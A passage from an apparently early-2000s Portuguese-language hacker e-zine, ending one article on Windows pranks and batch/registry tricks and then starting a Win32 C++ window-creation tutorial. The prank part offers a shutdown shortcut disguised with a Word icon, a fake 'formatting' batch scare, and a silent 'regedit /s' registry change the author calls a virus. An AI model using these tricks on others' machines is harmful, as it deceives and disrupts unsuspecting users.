DICAS:  Para  desfazer  isso,  simplesmente  altere  o  valor  para  "HH:mm"  ou
simplesmente o delete-o.

ATENÇÃO: Só  lembrando que  com o  regedit a  gente só  brinca se  souber o  que
estiver fazendo :).


4 - Um atalho destrutivo, ou melhor, reiniciativo.

Bom, isso eu descobri a  pouco tempo e é até  divertido (quando não faz isso  no
computador da escola... perdi 10 pontos por causa disso... :().
Esse é o mais fácil de todos. Faça o seguinte:
Sabe a área de trabalho? Aquela  que fica o ícone do "Meu  computador"? Lembrou?
Ótimo!!!;
Clique com o botão direito do mouse e clique em "Novo" e em seguida em "Atalho";
Nessa janelinha que abriu aí pedindo para inserir o nome do caminho do que  você
quer abrir, digite "C:\WINDOWS\rundll.exe user.exe,exitwindows";
Depois dê um nome para ele e em seguida o execute-o!;

DICAS: Você pode alterar a figura dele colocando o ícone do Microsoft Word,  por
exemplo, assim seus amigos "LEIGOS" irão  quebrar a cabeça para descobrir o  por
quê que o computador desliga/reinicia :). Não existe só o caminho para desligar,
tem também como reiniciar!

ATENÇÃO: Não faça isso nas aulas de informática, perdi 10 pontos por isso :(...


5 - Badcom: Básico do Básico

Badcom pra quem não sabe é  uma linguagem não estrutudara padrão do  windows. Já
viu aqueles arquivos .bat que tem o desenho de uma engrenagem no meio???  Então!
Aquilo usa badcom para ser executado!
Se eu fosse explicar tudo sobre badcom demoraria muito, então pretendo  escrever
um  tutorial só  sobre badcom  futuramente. Mas  o explicar  o básico  que é  o
suficiente para se criar algo "eficaz" :D.
Vamos  começar pelo  qual programa  que você  irá precisar,  você precisará  de:
Qualquer editor  de texto;  meu preferido  é o  "Bloco de  notas" :), pronto! Só
disso que você precisará.
Bem, vamos  começar fazendo  um simples  programa no  melhor estilo  do "Show do
Milhão"(huahuahua) :D. Abra o seu editor de texto normalmente e faça o seguinte:


----------------------------xxx CuTe HeRe xxx-----------------------------------

@echo off
cls
echo "Bem-Vindo ao Show do Badcom!"
echo.
echo Visite: http:\\www.infoshack.cjb.net e http:\\cdm.frontthescene.com.br
echo Fale com a gente: irc.brasnet.org /join #motd e /join #mercenaries
echo.
echo Stupidy Program Created by IP_FIX
echo.
echo Escolha uma alternativa:
echo.
echo [1] Começar logo a jogar essa ****.
echo [2] Quero sair. Nao tenho capacidade mental para jogar esse jogo ridiculo.
echo.
choice/c12
if errorlevel 2 goto SAIR
if errorlevel 1 goto JOGAR
:SAIR
echo.
echo.
echo Que foi? Vai fugir agora? Voce nao eh o hackao bonzao que consegue invadir sites por "Pasta da Web" e se sente o maximo com isso? Tah com medo de que? Ei, volta aqui!!! Nao corre nao, to brincando...!!! Bah, correu covarde, entao vou aproveitar o momento para formatar o computador... Ahhh, voce voltou... Voce quer que eu formate seu pc??? Sim ou Nao?
echo.
choice/csn
if errorlevel n goto FORMATAR
if errorlevel s goto FORMATAR
:FORMATAR
echo.
echo Nao me interessa sua decisao, eu vou formatar seu HD pronto e acabou! Adeus! Huahauhauhauhauhauhuhauhauahuahuahauhauhauhauha!!! Se vira agora que voce nao nasceu umbigado comigo!!!
echo.
echo Formatando...
echo.
pause
dir
dir
dir
dir
dir
dir
dir
cls
echo Formatacao concluida.
echo.
echo Quase morre do coracao hein hackao???
echo.
echo Visite: http:\\www.infoshack.cjb.net e http:\\cdm.frontthescene.com.br
echo Fale com a gente: irc.brasnet.org /join #motd e /join #mercenaries
echo.
echo Stupidy Program Created by IP_FIX
echo ;)
exit
:JOGAR
echo.
echo Pergunta valendo US$0,00.
echo.
echo Qual a cor do cavalo branco de Napoleao???
echo.
echo [1] Azul
echo [2] Verde
echo [3] Cinza
echo [4] Rosa
echo.
choice/c1234
if errorlevel 4 goto FIM
if errorlevel 3 goto FIM
if errorlevel 2 goto FIM
if errorlevel 1 goto FIM
:FIM
echo.
echo Errado!!!
echo.
echo Nao acredito que voce errou isso... Voce nao merece mais jogar esse super jogo com mais de 24000(hmmm) perguntas ineditas nunca antes vistas nem mesmo pelo criador desse stupid program!!!
echo.
echo Por causa de sua "falta de inteligencia" seu computador sera formatado! Adeus!
echo.
echo Formatando...
pause
dir
dir
dir
dir
dir
dir
dir
cls
echo Formatacao concluida.
echo.
echo Da proxima vez sera de verdade. =)
echo.
echo Visite: http:\\www.infoshack.cjb.net e http:\\cdm.frontthescene.com.br
echo Fale com a gente: irc.brasnet.org /join #motd e /join #mercenaries
echo.
echo Stupid Program Created by IP_FIX
echo ;)
exit

-------------------------------xxx CuTe HeRe xxx-------------------------------


Agora uma breve explicação do que cada linha de comando faz:

@echo off //Isso faz com que não apareça nada na tela;

echo //Esse comando faz com que seja imprimido caracteres na tela;

echo. //Este faz pular uma linha;

choice/c12 //Este comando te dá a opção de escolha, sendo que nesse caso você só
poderá escolher 1 e 2;

:SAIR  //Essa  seria a  "Função"  do Badcom,  perceba  que sempre  ela  deve ser
acompanhada pelos dois pontos ":";

dir, cls, pause //Sem comentários...;

Bem galera, esse "Programa Estúpido" que fiz foi só pra dá uma introdução (hmmm)
de um badcom bastante simples e básico.  Lembram que falei que se mexesse com  o
"Registro do Windows" (Regedit) sem saber  o que está fazendo, poderia sair  uma
merda que só vendo pra crer? Bom,  que tal fazer um simples vírus que  faz isso?
Essa última parte desse tutorial ensinará o básico de como mexer com o registro.
Mas torno  a repetir:  Cuidado na  hora de  testar seu  .bat, ele  pode se virar
contra você e você não terá chance de reverter a situação(às vezes).

Olhe aqui abaixo outro exemplo banal:

------------------------------xxx CuTe HeRe xxx--------------------------------

REGEDIT4

[HKEY_CURRENT_USER\Control Panel\International]

"sTimeFormat"="IP_FIX"

------------------------------xxx CuTe HeRe xxx--------------------------------

Bom, pra quem prestou atenção no que disse anteriormente (duvido muito...)  sabe
o que  isso faz.  Só tem  um pequeno  problema nisso  tudo. Se você colocar isso
direto  no  seu  badcom,  você  não  conseguirá  adiconar  essas  informações ao
registro.

Para conseguir faça o seguinte:

a) Abra o seu editor de texto normalmente;
b) Cole isso tudo lá;
c) E salve como a extensão ".reg";
d) Execute e de OK, agora basta reiniciar o sistema.

Tá, mas agora você deve estar se perguntando: " - Como poderei usar isso no  meu
badcom  que  é  ".bat"  e  adicionar essas  informações  sem  a  pessoa  ter que
confirmar???".

Isso  é  simples  oras!  Basta  você colocar  a  linha  de  comando  "regedit /s
Hora_Certa.reg" em qualquer  local do seu  badcom e pronto!!!  Você adicionou as
informações no registro com sucesso sem você mesmo ter percebido!!! :D

DICAS: Com badcom dá pra fazer coisas fantásticas, desde joguinhos de  perguntas
e  respostas  (hauhauhauha)  até  uma desconfiguração  total  do  seu  sistema e
registro e até exclusão de qualquer tipos de arquivos(lembram do deltree???). Vá
no localizar e digite "*.bat", vai aparecer vários, clique com o botão direito e
clique em editar. Tá vendo? Você pode ter certeza da real intenção desse bath  e
pode ver várias outras linhas de comandos, foi assim que aprendi badcom, sozinho
na raça :). Dá pra fazer o mesmo com "*.reg".



ATENÇÃO: Lembre-se: Combinar o badcom com o registro é uma combinação perigosa e
fatal. Por isso, não esqueça de fazer sempre um backup do registro, para isso vá
no executar e digite "scanreg". Assim, caso você faça merda, tem como  restaurar
numa boa  com o  comando "scanreg/restore"(tem  que ser  executado no MS-DOS, ou
melhor, no modo de inicialização).

Pronto galera, acabou! Já pode passar pro assunto seguinte! A tortura já se foi!
Desculpe por não ter escrito algo melhor. Na verdade eu ia postar sobre  sockets
em Perl, mas não consegui terminar  meu portscan que eu iria usar  como exemplo.
No momento  também estudo  C/C++ bastante,  mas não  tinha nada  sobre o  que eu
poderia escrever. Então, resolvi escrever um pouco sobre badcom porquê essa  foi
a primeira  linguagem que  aprendi e  que por  causa dela  é que estou aqui hoje
(lembra  _LiNe_SkOFF_?). Vamos  lá galera,  juízo na  cabeça de  vocês, não  se
aprende nada executando exploits por aí sem saber como funciona e sem saber se é
seguro, ou pior ainda,  sem saber se proteger  pelo menos. Programação não  é só
lazer ou  cultura, é  PROFISSÃO! É  o "ganha-pão"  de muita  gente passar a vida
programando, então larguem esses exploits e vão aprender a fazer os seus!!!

!!!THAT´S ALL FOLKS!!!





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 06 ]=-=[ Programando API em C++ para Windows ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Essa matéria é em homenagem à meu chegado, Inferninh0. É mais como desculpa pela
minha primeira matéria que saiu um lixo, espero que essa compense =]


C++ API

Não vou dar noções básicas sobre C/C++.

A interface  API (Application  Program Interface)  corresponde a  um conjunto de
system  calls oferecidas  por um  determinado sistema  operacional. Neste  caso,
Windows.  A biblioteca  API de  Windows é  extensa, contendo  as mais  variadas
funções.  Não  pretendo  citar  todas,  mas  sim  as  que  eu  considerar   mais
importantes, mesmo assim,  pretendo fazer um  trabalho extenso. Para  não tornar
essa  matéria  um  tanto  monótona,  vou  restringi-la  à  explicação  à   nível
superficial. Não  entrarei em  detalhes como  estrutura das  funções, pois  isso
somente consumirá mais e mais bytes.

Um dos maiores  atrativos do Windows  é seu sistema  de janelas, que  permite ao
usuário  navegar  entre  elas  e  coloca-las  à  disposição  mais   conveniente.
Programadores de VB sabem  o quanto é fácil  criar uma janela, mas  em C++, isso
pode se tornar um processo que requer alguns procedimentos iniciais.

Primeiramente vamos analisar a estrutura mais básica de um programa Win32 em C++:


#include <windows.h>

int _stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR nCmdLine, int nCmdShow)
{
return 0;
}


Para manter compatibilidade, a função é declarada como _stdcall, porém em alguns
compiladores pode estar definida como WINAPI ou outras macros. A função  WinMain
tem como  objetivo definir  o inicio  do programa.  É relativamente semelhante à
função main, só que  é executada em contexto  Win32 hehe. Os parâmetros  são bem
simples:

Antes, o int de retorno: Da mesma  maneira que a função main(), quando a  função
WinMain() retornar um valor, esta finalizará o programa.

HINSTANCE: a HINSTANCE representa um valor de 32 bit´s que identifica um  objeto
no  sistema. O  sistema operacional  passa este  valor para  o aplicativo  para
identificar o aplicativo enquanto ele está  sendo executado e o libera quando  o
aplicativo é finalizado.

A primeira HINSTANCE (hInstance) refere-se ao valor de identificação passado  ao
aplicativo. A segunda (hPrevInstance) refere-se  á um valor curioso, é  nela que
vc recebe  o valor  da HINSTANCE  de outra  instância de  seu aplicativo,  dessa
maneira você pode monitorar se seu  aplicativo está sendo executado mais de  uma
vez e bloquear as  instanciações de seu programa,  caso o programa esteja  sendo
executado primariamente, esse valor passa a ser NULL.

LPSTR é  uma implementação  de char*.  nCmdLine corresponde  á linha  de comando
passada ao seu aplicativo,  ou, aos parâmetros á  ele passados. Como um  simples
exemplo  posso citar  o Internet  Explorer. A  linha de  comando á  ele passada
corresponde à página que será exibida.

nCmdShow corresponde  a um  valor identificando  o estado  inicial da  janela, é
recomendável que esse valor seja passado como 2º parâmetro de ShowWindow().

Aí está o ponto de entrada para qualquer programa Win32. Como esse tutorial  tem
como foco a criação de um programa Win32, iremos direto ao ponto: Como criar uma
simples janela?

A API do  Windows fornece uma  estrutura que descreve  os comportamentos padrões
para qualquer janela. Um tópico importante, é que num ambiente de programação em
C++ todas as classes e estruturas  são consideradas como objetos. Essa visão  se
traduz no Windows quando falamos sobre janelas e controles.

Tanto uma janela quanto  um controle são objetos  primários na construção de  um
aplicativo Win32, e, pela analise do Windows, são iguais.

Uma janela  corresponde à  uma área  (geralmente retangular)  num espaço virtual
conhecido como desktop, não seria correto  afirmar que um controle não passa  de
uma janela dentro de um espaço conhecido como outra janela qualquer?

É assim que você deve interpretar  janelas e controles, não como estruturas  que
diferem entre si, mas estruturas semelhantes entre si.

A  API  do Windows  fornece  uma estrutura  básica  para qualquer  janela,  que,
geralmente  em  controles já  é  predefinida. Essa  estrutura  é conhecida  como
WNDCLASS.

Como  essa  estrutura é  pertencente  à API  do  Win95, ficou  atrasada  para as
evoluções do software,  assim sendo, foi  criada uma estrutura  equivalente, que
possui mais opções, a WNDCLASSEX.

Ao longo do tutorial, você verá muitas funções e estruturas que foram  recriadas
com o sufixo  EX, porém todas  as funções e  estruturas mais antigas  prevalecem
ainda  hoje.  Por  razões  de  compatibilidade  vou  citar  mais  as  funções EX
(EXtended) do que as mais antigas.


A estrutura WNDCLASSEX possui os seguintes membros:

cbClsExtra – Corresponde à um  valor  em bytes que devem ser alocados  depois da
WNDCLASSEX na memória, o Windows inicializa este valor como zero.

cbSize – Um unsigned int que corresponde ao tamanho da estrutura, geralmente  um
sizeof(WNDCLASSEX) é suficiente ;]

cbWndExtra – Um valor que corresponde ao número de bytes que devem ser  alocados
após a instância da janela, o  Windows inicializa esse valor como zero,  porém é
recomendável que este valor seja  alterado para DLGWINDOWEXTRA caso você  deseje
utilizar caixas de diálogos criadas com WNDCLASSEX.

hbrBackground – Um HBRUSH que corresponde ao fundo inicial da janela, geralmente
esse  valor  é  igualado  à  um  dos  valores  predefinidos  do  sistema,   como
WINDOW_COLOR.

hCursor –  Corresponde à  um HCURSOR  que representa  o cursor  que será exibido
dentro da janela.

hIcon – Corresponde ao Ícone grande  a ser exibido representando a janela,  como
no menu de alt+tab.

hIconSm –  Corresponde ao  ícone pequeno  a ser  exibido na  barra de  título da
janela.

hInstance – Corresponde  à instância que  identifica um objeto  no sistema, esse
valor é passado ao  programa para que ele  não possa acessar objetos  externos à
seu processo indevidamente.  Deve-se atribuir à  esse valor a  hInstance que foi
passada à função WinMain.

lpfnWndProc  – Corresponde  à uma  função que  recebe as  mensagens enviadas  à
janela, em termos  de leigo, corresponde  à função responsável  por gerenciar os
eventos que ocorrem dentro da janela.

lpszClassName – Corresponde à uma string que identifica a classe.

lpszMenuName – Corresponde à uma string que aponta para o nome de menu associado
à esta janela. Este tipo de menu é criado no arquivo de resources do aplicativo.
Caso o valor seja identificado como  um inteiro no arquivo de resource,  deve-se
utilizar a macro MAKEINTRESOURCE.

style – Corresponde à um comportamento padrão da janela.


Qualquer  um  destes membros  pode  ser validado  como  NULL, porém  alguns  são
essenciais  na  construção   de  uma  janela.   Agora  vamos  analisar   algumas
peculiaridades de alguns deles.

A WNDCLASS não apresenta os seguintes valores: cbSize e hIconSm.

hbrBackground
Esta propriedade refere-se à  um HBRUSH que identifica  o tipo de fundo  que uma
janela receberá. É recomendável que se utilize somente cores. Há valores padrões
do sistema que podem ser utilizados:


COLOR_ACTIVEBORDER
COLOR_ACTIVECAPTION
COLOR_APPWORKSPACE
COLOR_BACKGROUND
COLOR_BTNFACE
COLOR_BTNSHADOW
COLOR_BTNTEXT
COLOR_CAPTIONTEXT
COLOR_GRAYTEXT
COLOR_HIGHLIGHT
COLOR_HIGHLIGHTTEXT
COLOR_INACTIVEBORDER
COLOR_INACTIVECAPTION
COLOR_MENU
COLOR_MENUTEXT
COLOR_SCROLLBAR
COLOR_WINDOW
COLOR_WINDOWFRAME
COLOR_WINDOWTEXT


hCursor
Assim como hIcon e hIconSm, este  valor pode ser criado no arquivo  de resource,
porém há tipos predefinidos de cursors que podem ser carregados utilizando-se  a
função LoadCursor, passando o primeiro  valor (hInstance) como NULL e  o segundo
como o valor a ser utilizado:


IDC_APPSTARTING
IDC_ARROW
IDC_CROSS
IDC_IBEAM
IDC_ICON
IDC_NO
IDC_SIZE
IDC_SIZEALL
IDC_SIZENESW
IDC_SIZENS
IDC_SIZENWSE
IDC_SIZEWE
IDC_UPARROW
IDC_WAIT


hIcon e hIconSm
Podem  ser  carregados valores  do  sistema utilizando-se  a  função LoadCursor,
passando o primeiro valor como NULL e o segundo como o valor a ser utilizado:

IDI_APPLICATION
IDI_ASTERISK
IDI_EXCLAMATION
IDI_HAND
IDI_QUESTION
IDI_WINLOGO


lpfnWndProc
O Window Procedure é uma função responsável por gerenciar as mensagens recebidas
em uma janela. A sintaxe do Window Procedure é:

LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

O valor de retorno corresponde a um long.

HWND é um unsigned  int que corresponde ao  valor do window handle,  ou seja, um
valor utilizado para a manipulação da janela.

Msg  corresponde ao  valor numérico  da mensagem  recebida pela  janela, wParam
corresponde à um DWORD com valores passados à Msg, o mesmo vale para lParam.


style

Define estilos padrões que alteram a performance da janela:


CS_BYTEALIGNCLIENT e CS_BYTEALIGNWINDOW
Alinham a janela em um determinado contexto na posição horizontal para  melhorar
a performance em operações gráficas. Estes estilos afetam a posição horizontal e
largura da janela. Não é muito utilizado

CS_CLASSDC
Aloca um DC para ser utilizado por todas as janelas da classe. É utilizado  para
diminuir  o tempo  de espera  em operações  gráficas. Este  estilo permite  que
somente uma janela manipule operações gráficas por vez

CS_DBLCLKS
Permite que a janela receba mensagens sobre cliques duplos (DblClick)

CS_GLOBALCLASS
Permite que uma janela seja criada  sem a necessidade que a hInstance  da classe
seja a mesma da janela. É utilizada em controles que são inicializados em DLLs

CS_HREDRAW e CS_VREDRAW
Redesenha  toda  a   janela  caso  esta   seja  modificada  horizontalmente   ou
verticalmente respectivamente. Tanto vale para movimentações como para reajustes
de tamanho

CS_NOCLOSE
Desabilita todas as opções naturais para se fechar uma janela

CS_OWNDC
Aloca um DC único para cada janela da classe

CS_PARENTDC
Permite que  janelas Child  possam realizar  operações gráficas  em suas janelas
pai. Essa opção aumenta a performance  de operações gráficas, já que uma  janela
dessa classe recebe um cachê de memória maior para alocar seu DC

CS_SAVEBITS
Caso uma janela seja parcialmente obscurecida por outra janela, essa opção salva
a  parte  obscurecida como  um  bitmap na  memória  para aumentar  a  rapidez no
processo de redesenhar a  janela, porém um certo  tempo é perdido para  alocar o
bitmap. Essa opção não é recomendada



DC´s serão explicados mais tarde.

Operações  gráficas referem-se  ao ato  de desenhar  uma janela  ou controle  ou
outras funções GDI.

Um simples exemplo da construção de uma WNDCLASSEX:

WNDCLASSEX wnd;
wnd.cbClsExtra  = 0;
wnd.cbSize = sizeof(WNDCLASSEX);
wnd.cbWndExtra = 0;
wnd.hbrBackground = (HBRUSH)(COLOR_WINDOW);
wnd.hCursor = LoadCursor(NULL,IDC_ARROW);
wnd.hIcon = LoadIcon(NULL,IDI_APPLICATION);
wnd.hIconSm = LoadIcon(NULL,IDI_APPLICATION);
wnd.hInstance = hInstance;
wnd.lpfnWndProc = (WNDPROC) WProc;
wnd.lpszClassName = "MainWnd";
wnd.lpszMenuName = NULL;
wnd.style = CS_OWNDC;


Programadores mais “avançados” podem estudar a sintaxe da WNDCLASSEX e  montá-la
em somente uma linha de código ;]
Bom,  após a  criação da  WNDCLASSEX, deve-se  registrá-la para  que possa  ser
utilizada pelos threads do  processo em execução. Isso  se faz com o  auxílio da
função RegisterClassEx.

RegisterClassEx(&wnd);

O único parâmetro é  o endereço da WNDCLASSEX  a ser registrada. Logicamente  há
seu equivalente para a WNDCLASS:

RegisterClass(&WNDCLASS);

Estas funções  retornam um  valor (ATOM)  que identifica  unicamente a classe no
sistema. Caso haja erro, o valor de retorno é 0.

Bom, e agora? Agora vamos a parte principal, a tão esperada função que realmente
cria a janela, a CreateWindow(Ex).

A CreateWindowEX() possui  12 parâmetros, enquanto  que a CreateWindow()  possui
11,  sendo  assim elas  só  diferem no  parâmetro  dwExStyle, que,  logicamente,
pertence à CreateWindowEx e não à CreateWindow.

Vamos dar uma olhada nos seus parâmetros:

dwExStyle – Esse  valor é uma  DWORD (int de  32 bit´s para  os mais leigos) que
relata à função  alguns comportamentos extendidos  referentes à janela.  Veremos
seus possíveis valores mais à frente.

lpClassName – Esse valor refere-se ao nome da WNDCLASS registrada, ou seja  deve
ser o mesmo que lpszClassName da classe registrada.

lpWindowName – Um valor que na  maioria das vezes serve como string  primária da
janela.

dwtyle – Comportamentos padrões das janelas.

x e y – int´s que definem as posições horizontal e vertical (respectivamente) da
janela (Left e Top).

nWidth  e  nHeight  –  int´s  que  definem  a  largura  e  a  altura  da  janela
(respectivamente) (Width e Height).

hWndParent – Corresponde  à um HWND  (calma aí) que  identifica a janela  pai da
janela a ser criada. É recomendável  que este valor não seja NULL,  assim sendo,
para  janelas comuns,  deve-se utilizar  a função  GetDesktopWindow(void); como
parâmetro para este valor.

hMenu – Identifica um Menu criado em API pertencente à esta janela.

HInstance – Use sua imaginação ;]

lpParam – Há muito esse parâmetro deixou de ser utilizado. Seu valor consiste em
uma estrutura que contêm  todos os valores acima  citados e estes da  função são
substituídos pelos desta estrutura. Perda de memória, não? ;/

O valor de retorno corresponde à um  HWND. O HWND, ou Window Handle, é  um valor
de 32 bit´s  que identifica uma  janela para que  esta possa ser  manipulada por
diversas funções. Caso a  função falhe, o retorno  é NULL. Em API,  toda função,
quando retorna um erro,  pode ter esse valor  de erro re-adquirido com  a função
GetLastError(void), que retorna uma DWORD (int) com o valor de retorno da função
que retornou o erro.


Os possíveis valores para dwExStyle são:

WS_EX_ACCEPTFILES
Esta janela aceita arquivos arrastados até ela

WS_EX_CLIENTEDGE
Cria uma borda interna à área interna da janela

WS_EX_CONTEXTHELP
Inclui o botão de interrogação na barra de título da janela

WS_EX_CONTROLPARENT
Permite  que  seja  possível  navegar  entre  as  janelas  child  desta   janela
utilizando-se a tecla TAB

WS_EX_DLGMODALFRAME
Cria bordas em janelas com o valor WS_POPUP em dwStyle

WS_EX_LEFT e WS_EX_RIGHT
Cria uma janela que possui propriedades de texto alinhado à esquerda (padrão) ou
à direita, respectivamente

WS_EX_LEFTSCROLLBAR e WS_EX_RIGHTSCROLLBAR
Se  a barra  de rolagem  estiver visível  na janela,  essas opções  definem seu
alinhamento, à esquerda ou à direita (padrão) respectivamente

WS_EX_LTRREADING e  WS_EX_RTLREADING
O texto  da janela  é apresentado  da ordem  especificada, esquerda-para-direita
(padrão) ou direita-para-esquerda.  O segundo valor  só funciona em  línguas que
possuem suporte para este tipo de escrita, como o Hebraico

WS_EX_MDICHILD
Cria uma janela child

WS_EX_NOPARENTNOTIFY
Especifica  que uma  janela child  não irá  notificar sua  janela-pai sobre  sua
criação ou destruição

WS_EX_OVERLAPPEDWINDOW
Combina WS_EX_CLIENTEDGE e WS_EX_WINDOWEDGE

WS_EX_PALETTEWINDOW
Combina WS_EX_WINDOWEDGE, WS_EX_TOOLWINDOW e WS_EX_TOPMOST

WS_EX_STATICEDGE
Cria  uma  janela  com  uma borda  (interna)  em  sua  área externa,  geralmente
utilizados em controles estáticos

WS_EX_TOOLWINDOW
Cria uma janela geralmente utilizada como janela de ferramentas, com uma borda e
fonte de título menores que o original. Esse tipo de janela não aparece na barra
de tarefas ou no menu de ALT+TAB

WS_EX_TOPMOST
Especifica que a  janela deve sempre  sobrepor as janelas  que não possuem  este
valor

WS_EX_TRANSPARENT
Cria uma janela 100%  transparente (não translúcida ;|).  Este tipo de janela  é
comumente utilizado em operações de realinhamento de janela. Este tipo de janela
não é, geralmente, utilizado por aplicativos

WS_EX_WINDOWEDGE
Cria uma janela com uma borda (externa) em sua área externa


Para  x,y, nWidth  e nHeight,  o sistema  provê valores  padrões que  podem ser
utilizados igualando estes valores à CW_USEDEFAULT.

Os possíveis valores de dwStyle:


WS_BORDER
Cria uma janela com uma borda fina

WS_CAPTION
Cria uma janela com uma barra de título e WS_BORDER

WS_CHILD e WS_CHILDWINDOW
Cria uma janela child. Este valor não pode ser mesclado com WS_POPUP

WS_CLIPCHILDREN
Exclui a área ocupada pelas janelas child quando uma janela receber uma mensagem
WM_PAINT (operação gráfica). Esse valor deve ser utilizado em janelas pai

WS_CLIPSIBLINGS
Esse valor evita alguns problemas gráficos com janelas child. Você mesmo  poderá
fazer um  teste utilizandp  2 janelas  child, uma  com este  valor e  outra sem,
coloque uma sobre a outra e mude-as de tamanho e posição ;]

WS_DISABLED
Cria uma janela desabilitada. Esse tipo de janela não recebe entrada do usuário

WS_DLGFRAME
Cria uma borda que é comumente utilizada em caixas de diálogo

WS_GROUP
Especifica o primeiro controle em um grupo de controles

WS_HSCROLL e WS_VSCROLL
Cria  uma  janela que  possui  uma barra  de  rolagem horizontal  e/ou  vertical
(respectivamente)

WS_ICONIC e WS_MINIMIZE
Cria uma janela que está inicialmente minimizada

WS_MAXIMIZE
Cria uma janela que está inicialmente maximizada

WS_MAXIMIZEBOX e WS_MINIMIZEBOX
Cria uma janela que possui um botão de maximizar e/ou minimizar (respectivamente)

WS_OVERLAPPED e WS_TILED
Cria uma janela que possui uma borda e uma barra de titulo

WS_OVERLAPPEDWINDOW e WS_TILEDWINDOW
Cria  uma  janela num  estilo  mais comum  mesclando  WS_OVERLAPPED, WS_CAPTION,
WS_SYSMENU, WS_THICKFRAME, WS_MINIMIZEBOX e WS_MAXIMIZEBOX

WS_POPUP
Cria uma janela popup, sem bordas ou barra de titulo

WS_POPUPWINDOW
Mescla WS_BORDER, WS_POPUP e WS_SYSMENU

WS_SIZEBOX e WS_THICKFRAME
Cria uma janela que possui uma barra de reajuste de tamanho

WS_SYSMENU
Cria uma janela com um menu de janela comum. O valor WS_CAPTION é recomendado

WS_TABSTOP
Especifica um  controle que  pode receber  o foco  quando o  usuário pressiona a
tecla TAB

WS_VISIBLE
Cria uma janela que esta inicialmente visível

Exemplo =D:


HWND MainWnd = CreateWindowEx(WS_EX_WINDOWEDGE,"MainWnd","Janela de exemplo",
WS_OVERLAPPEDWINDOW,120,150, CW_USEDEFAULT,450,GetDesktopWindow(),NULL,hInstance,NULL);


Uma simples verificação:

If(!MainWnd){PostQuitMessage(0);}


A função PostQuitMessage(int) finaliza o programa terminando o seu Message  Loop
que será visto adiante.
Após  a  criação da  janela,  se esta  não  houver sido  criada  com WS_SHOW,  é
necessário mostrá-la. Para isso utiliza-se ShowWindow(HWND, int).

Exemplo:


ShowWindow(MainWnd,SW_SHOWNORMAL);

Os valores do 2º parâmetro são:

SW_HIDE - Esconde a janela e passa o foco para a próxima janela
SW_MAXIMIZE - Maximiza a janela e recebe o foco
SW_MINIMIZE – Minimiza a janela e recebe o foco
SW_RESTORE - Restaura a janela a seu status padrão e recebe o foco
SW_SHOW – Mostra a janela e recebe o foco
SW_SHOWMAXIMIZED, SW_SHOWMINIMIZED –  Mostra a janela  e a maximiza  ou minimiza
(respectivamente)
SW_SHOWMINNOACTIVE – Minimiza a janela e não recebe foco
SW_SHOWNA – Mostra a janela em seu estado atual, não recebe o foco
SW_SHOWNOACTIVE – Mostra a janela em sua posição e tamanho recentes, não  recebe
o foco
SW_SHOWNORMAL – Mostra a janela, faz o mesmo que SW_RESTORE e recebe o foco
nCmdShow – Isso  mesmo, este é  o valor passado  ao aplicativo por  WinMain, que
pode ser utilizado como valor padrão para o inicio das janelas do aplicativo.


O valor de retorno é um bool. Caso a janela estivesse anteriormente escondida, o
valor de retorno é false (0), caso contrário é true (1).

É  comum  utilizar  também UpdateWindow(HWND);  para  redesenhar  a janela  após
mostra-la:

UpdateWindow(MainWnd);

Caso a função falhe, o valor de retorno (bool) é false.


A partir daqui, caso você deseje que função subseqüentes sejam realizadas,  pode
incluí-las no código.
Após tudo isso você pensa que acabamos com a WinMain???
Lembra-se que quando a  função retorna um valor  ou chega ao seu  fim o programa
termina? Então, como os programas Win32 rodam por tempo indefinido?
Simples, com a utilização de um pequeno artifício chamado Message Loop.
O Message Loop, como seu nome sugere, consiste em um loop no qual uma mensagem é
analisada e enviada à janela. O loop consiste em 3 funções simples:


GetMessage(&MSG,HWND,unsigned int, unsigned int);
TranslateMessage(&MSG);
DispatchMessage(&MSG)

O MSG corresponde à um valor que identifica uma mensagem de sistema.

Sintáxe comum de um message loop:

MSG msg;

while ( GetMessage(&msg,NULL,0,0) )
{
TranslateMessage(&msg);
DispatchMessage(&msg);
}

Um sistema de mensagens é um  artifício do sistema operacional para coordenar  a
comunicação entre processos e não será abordado aqui.

A descrição do loop é simples:

while ( GetMessage(&msg,NULL,0,0) )

Esse linha simplesmente cria um loop no qual a função GetMessage pega a primeira
mensagem  na fila  de mensagens  do thread  atual. O  fato de  que as  mensagens
correspondem ao  thread atual  e não  à uma  janela especifica  provêm de  que o
segundo parâmetro é neutro, e assim deve permanecer, pois, caso uma janela  seja
descrita, com o fechamento de tal  janela o aplicativo todo seria finalizado  de
maneira indesejável.

O valor de retorno (bool), é true em casos normais, é false quando é  processada
uma mensagem WM_QUIT (Assim como a enviada por PostQuitMessage()) e –1 quando  a
função falha.

Caso você feche a janela descrita em  HWND, a função retornaria –1 para o  while
gerando, assim, um erro fatal ao aplicativo. Por estas razões, no message  loop,
HWND deve sempre ser NULL.

O 3º  parâmetro indica  a primeira  mensagem na  fila e  o 2º,  a última.  Estes
valores devem ser 0 para que as mensagens sejam processadas assim que chegarem à
fila.

TranslateMessage(&msg);

Essa função traduz mensagens que apresentam códigos virtuais para código  ASCII.
Tais mensagens são geralmente enviadas somente pelo teclado.


DispatchMessage(&msg);

Essa  função envia  a mensagem  para a  WindowProc responsável  pela janela  que
recebeu a mensagem.

Após o message loop, pode-se incluir normalmente o return ;]

return 0;

Aí  está  uma simples  WinMain.  Agora, vamos  à  WindowProc, que  analisará  as
mensagens enviadas para a janela. Como  já vimos, a sintaxe do Window  Procedure
é:

LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

E o valor de retorno corresponde a um long.


O primeiro  parâmetro da  função corresponde  ao HWND  da janela responsável por
receber a mensagem. O segundo, à mensagem em si, o terceiro e o quarto à  demais
parâmetros da mensagem.
O  método  mais  comum de  se  trabalhar  com o  WinProc  é  dando um  switch  e
verificando as mensagens enviadas:


LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{

switch(msg) {
case WM_DESTROY:{
PostQuitMessage(1);
}

case WM_CREATE:{
FazAlgumaCoisa();
}
}

